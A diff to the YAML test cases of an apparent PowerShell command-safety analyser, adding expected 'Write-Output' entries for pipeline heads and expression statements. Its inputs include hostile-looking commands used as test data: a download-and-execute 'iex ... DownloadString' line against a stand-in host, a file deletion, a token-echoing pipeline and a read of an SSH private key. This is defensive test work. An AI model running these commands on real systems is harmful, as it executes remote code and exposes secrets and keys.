@@ -885,16 +885,21 @@
   text: '[System.IO.File]::Delete(''C:\x'')'
   fixture: ps_ast/system-io-file-delete-c-x-51e540bb.json
   expect:
-    gray_has: ['ps-dynamic:InvokeMemberExpressionAst']
+    gray_has: ['ps-dynamic:InvokeMemberExpressionAst', 'ps-outside-command:InvokeMemberExpressionAst']
     exec_has: ['ps-dynamic:InvokeMemberExpressionAst']
-    commands: []
+    commands:
+    # revision 22: a statement that is an expression is judged as Write-Output of it
+    - program: "Write-Output"
+      args: ["$([System.IO.File]::Delete('C:\\x'))"]
 - id: cmd-scriptblock-create-invoke
   text: '[scriptblock]::Create(''whoami'').Invoke()'
   fixture: ps_ast/scriptblock-create-whoami-invoke-99e88fe2.json
   expect:
     gray_has: ['ps-dynamic:InvokeMemberExpressionAst']
     exec_has: ['ps-dynamic:InvokeMemberExpressionAst']
-    commands: []
+    commands:
+    - program: "Write-Output"
+      args: ["$([scriptblock]::Create('whoami').Invoke())"]
 - id: cmd-iex-downloadstring
   text: iex (New-Object Net.WebClient).DownloadString('http://x/a')
   fixture: ps_ast/iex-new-object-net-webclient-downloadstr-14acbe70.json
@@ -1718,6 +1723,11 @@
     gray: ["ps-pipeline-head-dynamic"]
     exec: []
     commands:
+    # revision 22: the head is a command of its own, judged as Write-Output
+    - program: "Write-Output"
+      args: ["$env:SECRET_TOKEN"]
+      gray: ["ps-dynamic-arg"]
+      pipe: true
     - program: "Select-Object"
       args: []
       gray: []
@@ -1727,6 +1737,8 @@
   expect:
     gray: ["ps-pipeline-head-dynamic"]
     commands:
+    - program: "Write-Output"
+      args: ["$x"]
     - program: "Get-ChildItem"
       args: ["-Path", "$x"]
       paths: [["$x", "read"]]
@@ -1753,6 +1765,8 @@
     gray_has: ["ps-pipeline-head-dynamic", "ps-dynamic:SubExpressionAst"]
     exec_has: ["ps-dynamic:SubExpressionAst"]
     commands:
+    - program: "Write-Output"
+      args: ["$($(Get-Content f))"]
     - program: "Get-Content"
       paths: [["f", "read"]]
     - program: "Select-Object"
@@ -1762,6 +1776,8 @@
   expect:
     gray_has: ["ps-pipeline-head-dynamic", "ps-dynamic:ArrayExpressionAst"]
     commands:
+    - program: "Write-Output"
+      args: ["$(@(1,2))"]
     - program: "Select-Object"
 - id: cmd-m1c2-head-member-access-is-gray
   text: "$x.Name | Get-Content"
@@ -1769,6 +1785,8 @@
   expect:
     gray_has: ["ps-pipeline-head-dynamic", "ps-dynamic:MemberExpressionAst"]
     commands:
+    - program: "Write-Output"
+      args: ["$($x.Name)"]
     - program: "Get-Content"
       args: ["-Path", "$($x.Name)"]
 - id: cmd-m1c2-head-method-call-is-gray
@@ -1777,6 +1795,8 @@
   expect:
     gray_has: ["ps-pipeline-head-dynamic", "ps-dynamic:InvokeMemberExpressionAst"]
     commands:
+    - program: "Write-Output"
+      args: ["$($x.ToString())"]
     - program: "Get-Content"
 - id: cmd-m1c2-head-static-call-is-gray
   text: "[IO.Path]::GetTempPath() | Get-ChildItem"
@@ -1784,6 +1804,8 @@
   expect:
     gray_has: ["ps-pipeline-head-dynamic", "ps-dynamic:InvokeMemberExpressionAst"]
     commands:
+    - program: "Write-Output"
+      args: ["$([IO.Path]::GetTempPath())"]
     - program: "Get-ChildItem"
 - id: cmd-m1c2-head-expandable-string-is-gray-but-listed
   text: "\"$env:USERPROFILE\\.ssh\\id_rsa\" | Get-Content"
@@ -1791,6 +1813,10 @@
   expect:
     gray: ["ps-pipeline-head-dynamic"]
     commands:
+    # the string is printed here, not read: no path
+    - program: "Write-Output"
+      args: ["$env:USERPROFILE\\.ssh\\id_rsa"]
+      paths: []
     - program: "Get-Content"
       args: ["-Path", "$env:USERPROFILE\\.ssh\\id_rsa"]
       paths: [["$env:USERPROFILE\\.ssh\\id_rsa", "read"]]
@@ -1801,6 +1827,8 @@
   expect:
     gray: ["ps-pipeline-head-dynamic"]
     commands:
+    - program: "Write-Output"
+      args: ["$x"]
     - program: "Copy-Item"
       args: ["-Destination", "y"]
       gray_has: ["arguments-from-pipeline"]
